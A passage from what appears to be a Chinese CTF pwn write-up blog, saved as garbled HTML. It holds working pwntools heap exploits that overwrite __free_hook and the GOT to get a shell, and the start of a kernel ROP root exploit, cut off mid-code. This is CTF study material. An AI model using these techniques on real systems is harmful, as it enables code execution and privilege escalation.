class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ebbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="consumptionï¼šjsonåºåˆ—åŒ–-æŒ‡é’ˆè¦†ç›–æ‰“GOT"><a href="#consumptionï¼šjsonåºåˆ—åŒ–-æŒ‡é’ˆè¦†ç›–æ‰“GOT" class="headerlink" title="consumptionï¼šjsonåºåˆ—åŒ–+æŒ‡é’ˆè¦†ç›–æ‰“GOT"></a>consumptionï¼šjsonåºåˆ—åŒ–+æŒ‡é’ˆè¦†ç›–æ‰“GOT</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">[*] '/home/xinri/ccb/consumption/pwn'    Arch:       i386-32-little    RELRO:      No RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x8047000)    RUNPATH:    b'/home/xinri/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/'    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¼æ´ç‚¹åœ¨äºè¾“å…¥jsonåºåˆ—åŒ–æ•°æ®åˆ° v12 æ—¶å¯ä»¥è¦†ç›–åˆ° v13 å­˜å‚¨çš„æŒ‡é’ˆ<br><img src="/EXP_FILE/3f4738a03ed191dd7d29c949cb51c49b_MD5.jpeg"></p><p>è¿™é‡Œçš„<code>*a3</code>å°±æ˜¯ v13 å­˜å‚¨çš„æŒ‡é’ˆï¼Œå¯ä»¥è¦†ç›–ä¸º heaparray æ‰“GOT<br><img src="/EXP_FILE/1b5d02b0735b4b49c0ee482948b40c20_MD5.jpeg"></p><p>æœ‰ä¸ªå‘ç‚¹æ˜¯ error() å‡½æ•°é™¤äº†è¾“å‡ºâ€œout!â€å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œä½†æˆ‘å…ˆå…¥ä¸ºä¸»ä»¥ä¸ºä¼šexitï¼Œç™½è€—äº†å¾ˆé•¿æ—¶é—´ï¼Œnm<br><img src="/EXP_FILE/4577a05dba2432dd602cae7dc5d8c078_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">import</span> json    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>  p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#libc = ELF("/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6")  </span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> debug<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      pause<span class="token punctuation">(</span><span class="token punctuation">)</span>      gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>      sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> add_heap<span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"1","idx":0,"size":"'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> free_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"2","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>      <span class="token keyword">def</span> show_heap<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">'&#123;"choice":"3","idx":'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',"size":"","content":""&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> edit_heap<span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"5.exit\t\n"</span><span class="token punctuation">,</span><span class="token string">b'&#123;"choice":"4","idx":1,"size":"","content":"'</span> <span class="token operator">+</span> content <span class="token operator">+</span> <span class="token string">b'"&#125;'</span><span class="token punctuation">)</span>    <span class="token comment">#debug()  </span><span class="token comment">#pause()  </span>  heaplist <span class="token operator">=</span> <span class="token number">0x08051B10</span>  add_heap<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span>    <span class="token comment">#free_got = elf.got["free"]  </span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>    payload_1 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x4cc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heaplist <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>  add_heap<span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span>payload_1<span class="token punctuation">)</span>  <span class="token comment">#add_heap(0x8,"AAAA")  </span>  show_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\xf7"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>  log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc.address = "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    edit_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>    free_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">#debug()  </span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Driverï¼škROP"><a href="#Kylin-Driverï¼škROP" class="headerlink" title="Kylin_Driverï¼škROP"></a>Kylin_Driverï¼škROP</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 256M <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep,+smap <span class="token punctuation">\</span>    <span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    -no-shutdown <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€äº† SMEPã€SMAPã€KASLRï¼Œç»æµ‹è¯•å¼€äº†KPTI</p><p>è½½å…¥äº†ä¸€ä¸ªLKMï¼Œä½ç½®åœ¨ &#x2F;lib&#x2F;modules&#x2F;5.10.0-9-generic&#x2F;kernel&#x2F;test.ko</p><p>æ³¨å†Œäº†æ‚é¡¹è®¾å¤‡ç»“åˆæ³¨å†Œç»“æ„ä½“å¯çŸ¥è®¾å¤‡åç§°ä¸ºtestï¼Œè¯¥ç±»è®¾å¤‡çš„åº”ç”¨å±‚æ¥å£ä½äº&#x2F;devç›®å½•ï¼Œå¹¶ä¸”ä¸ºè¯¥è®¾å¤‡æ³¨å†Œäº†å¤„ç†å‡½æ•°<code>VrQsLpXwNfJrZtBpKjMvWsQpTyLnHrXs</code>ã€‚<br><img src="/EXP_FILE/c058402f080a342ea7305b929cc5681b_MD5.jpeg"></p><p><img src="/EXP_FILE/8e0fe6162bb3e5123ef9de3016c2b472_MD5.jpeg"></p><p>é¦–å…ˆæ ¡éªŒæˆ‘ä»¬ä¼ å…¥çš„bufï¼Œè¦æ±‚é€ä½ä¸0xF9å¼‚æˆ–ä¹‹åç­‰äº<code>gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</code></p><ul><li>0xDEADBEEFæ“ä½œç ï¼šå°†é©±åŠ¨æ¨¡å—åŸºå€æ”¾è¿›kbufï¼Œå†å°†æ•´ä¸ªkbufä¸0xF9å¼‚æˆ–åæ”¾å…¥åˆ° buf + 0x20 å¤„ï¼ˆpasswordåé¢ï¼‰</li><li>0xFEEDFACEæ“ä½œç ï¼šå°† buf+0x20 å†æ‹¿å‡ºæ¥ä¸0xF9å¼‚æˆ–åæ”¾å…¥kbufï¼ŒrspæŒ‡å‘kbufè¿›è¡Œretn<br><img src="/EXP_FILE/13c60f00d2f10013a8a5466b486e0fcb_MD5.jpeg"></li></ul><p>è®¾ç½® nokaslr åå†…æ ¸ç›´æ¥å¡æ­»äº†ï¼Œç›®å‰åŸå› ä¸æ˜ï¼Œåªèƒ½ç¡¬è°ƒkaslräº†<br><img src="/EXP_FILE/74b280be16995e17cd80a281600b9a79_MD5.jpeg"></p><p>å…ˆèµ°å¸¸è§„ropé“¾ï¼Œæˆ‘ä¸€å¼€å§‹ä¸æ˜ç™½ç»™æˆ‘ä»¬ä¸€ä¸ªLKMåŸºå€æœ‰ä»€ä¹ˆç”¨ï¼Œå“¦åŸæ¥æ˜¯LKMé‡Œæœ‰å¯¹cr4æ“ä½œçš„gadgetï¼Œä¸å…³SMAPçš„è¯commit_credä¼šcrash<br><img src="/EXP_FILE/ddce91073f73e8b83a9f81d9b0681095_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_READ</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_WRITE</span> <span class="token expression"><span class="token number">0xFEEDFACE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff81090c80</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RAX_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8308721f</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_RET</span> <span class="token expression"><span class="token number">0x0000000000000009</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RET</span> <span class="token expression"><span class="token number">0x000000000000000c</span><span class="token operator">+</span>lkm</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_CR4_RDI_RET</span> <span class="token expression"><span class="token number">0x000000000000000d</span><span class="token operator">+</span>lkm</span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810cf720</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810cfbe0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81c00ff0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred<span class="token operator">=</span><span class="token number">0xffffffff82864660</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/test"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc"</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'\0'</span><span class="token 